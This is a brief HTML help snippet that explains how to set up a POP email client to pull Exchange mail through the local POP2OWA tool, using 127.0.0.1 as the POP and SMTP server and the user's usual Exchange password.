First, run <strong>POP2OWA</strong>&nbsp; if it is not already running :) .<br /><br /> To configure your e-mail client, setup a new POP account to check mail from. <br /><br />For the POP server's address, type &quot;127.0.0.1&quot; (or if you modified the POP2OWA options, use whatever you changed the address to).Type the same for the SMTP server address.<br />Finally, your password will be the same as your normal Exchange password.<br /> <br /> Now just check your mail as usual. The account you just configured will retrieve your exchange messages!
